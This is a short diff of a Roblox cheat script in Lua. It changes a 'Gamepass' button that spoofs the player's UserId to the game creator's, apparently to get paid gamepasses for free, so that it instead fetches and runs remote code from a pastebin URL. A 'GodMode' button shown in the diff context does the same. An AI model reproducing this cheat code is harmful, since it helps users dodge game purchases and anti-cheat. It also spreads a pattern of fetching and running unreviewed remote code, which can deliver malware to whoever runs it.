@@ -117,5 +117,5 @@ PlayerSection:NewButton("GodMode", "No Damage taken", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/4rqXL7jh'))()
 end)
 PlayerSection:NewButton("Gamepass", "Free Game pass working on some games", function()
-   if game.CreatorType == Enum.CreatorType.User then game.Players.LocalPlayer.UserId = game.CreatorId end if game.CreatorType == Enum.CreatorType.Group then game.Players.LocalPlayer.UserId = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id end
+   loadstring(game:HttpGet('https://pastebin.com/raw/cDfuXLES'))()
 end)
